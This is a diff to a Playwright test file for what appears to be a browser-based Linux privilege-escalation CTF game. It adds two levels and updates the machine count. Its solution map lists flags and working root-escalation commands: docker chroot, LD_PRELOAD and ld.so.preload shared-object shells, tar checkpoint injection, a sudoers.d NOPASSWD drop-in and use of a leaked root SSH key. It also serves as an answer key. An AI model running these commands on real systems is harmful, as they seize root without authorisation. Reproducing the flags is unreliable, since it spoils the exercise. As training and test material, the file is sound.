@@ -15,7 +15,9 @@ const SOLUTIONS = {
     10: { flag: 'flag{d0cker_group_pwn}', cmds: ['docker run -v /:/mnt -it alpine chroot /mnt sh'] },
     11: { flag: 'flag{ld_pr3load_env_keep}', cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'sudo LD_PRELOAD=/tmp/x.so apache2ctl'] },
     12: { flag: 'flag{w1ldcard_tar_ch3ckpoint}', cmds: ['cd /home/player/share', "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh", 'touch ./--checkpoint=1', "touch './--checkpoint-action=exec=sh runme.sh'", 'wait'] },
-    13: { flag: 'flag{r00t_ssh_key_l00t}', final: true, cmds: ['ssh -i /opt/backup/id_rsa root@localhost'] },
+    13: { flag: 'flag{r00t_ssh_key_l00t}', cmds: ['ssh -i /opt/backup/id_rsa root@localhost'] },
+    14: { flag: 'flag{sud0ers_d_dr0pin}', cmds: ["echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", 'sudo bash'] },
+    15: { flag: 'flag{ld_s0_preload_glob4l}', final: true, cmds: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'] },
 };
 
 async function enter(page, id) {
@@ -45,11 +47,11 @@ for (const [id, sol] of Object.entries(SOLUTIONS)) {
     });
 }
 
-test('hub renders 13 machines across 3 tiers', async ({ page }) => {
+test('hub renders 15 machines across 3 tiers', async ({ page }) => {
     await page.goto('/');
-    await expect(page.locator('.machine-card')).toHaveCount(13);
+    await expect(page.locator('.machine-card')).toHaveCount(15);
     await expect(page.locator('.home-tier-label')).toHaveCount(3);
-    await expect(page.locator('#homeProgressText')).toHaveText('0 / 13');
+    await expect(page.locator('#homeProgressText')).toHaveText('0 / 15');
 });
 
 test('pipes: cat | wc -l counts passwd lines', async ({ page }) => {
